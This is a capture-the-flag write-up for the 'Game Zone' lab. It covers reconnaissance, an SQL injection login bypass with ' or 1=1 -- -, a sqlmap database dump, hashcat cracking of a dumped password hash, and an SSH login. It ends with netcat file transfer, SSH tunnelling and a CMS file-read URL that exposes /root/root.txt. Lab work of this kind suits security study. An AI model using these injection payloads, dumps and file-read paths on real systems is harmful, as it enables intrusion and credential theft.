# Game Zone


## Recon


_Port Scan_

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

_Gobuster_

```
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/images (Status: 301)
/index.php (Status: 200)
/server-status (Status: 403)
```

All the enumerations didn't gave us something to go about so i started to check the login field on the server

By using classic sql injection 

```
' or 1=1 -- - 
```

in the user textbox, i skipped the login part


## Exploiting


After we got redirected to */portal.php* we find that if we put a single `'` the site responds with an sql error.
 
We will use *sqlmap* to dump the database.

First we intercept the request from *burpsuite* to feed it into sqlmap.


```
sqlmap -r request.txt --dbs     
```

Now we have the database

```
available databases [5]:
[*] db
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

```

We have something interesting

```
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```

By running *hash-identifier* we find out that this is SHA-256

To crack the password we use hashcat

```
▶ hashcat -m 1400 passowrd_hash rockyou.txt --show
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124
```

Now that we have creds we can try and login into the server by using ssh


```
▶ ssh agent47@10.10.45.172 
```

And now we are logged in.

We have found the user flag on the home directory

```
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt 
649ac17b1480ac13ef1e4fa579dac95c
agent47@gamezone:~$ 
```

## Privilege Escalation 

We will transfer *linPEAS* to the server by using *netcat*

```
Client: 
▶ nc 10.10.45.172 6942 < PEAS/linpeas.sh 

Server:
nc -nlvp 6942 > linpeas.sh

```

Nothing interesting was found but we find that there's a service running on port 10000, but it's blocked by firewall so we need to tunnel to access it.


```
ssh -L 10000:localhost:10000 agent47@ip
```

We find that there's a *CMS version 1.580* that's running so we look for it

After looking on google and *searchsploit* we know that we can use metasploit to exploit it but this isn't allow often on the exam so we have to do manual.

```
http://localhost:10000/file/show.cgi/root/root.txt
```

We only need to extract the root flag which is in /root/root.txt so we can enter that and get the flag.


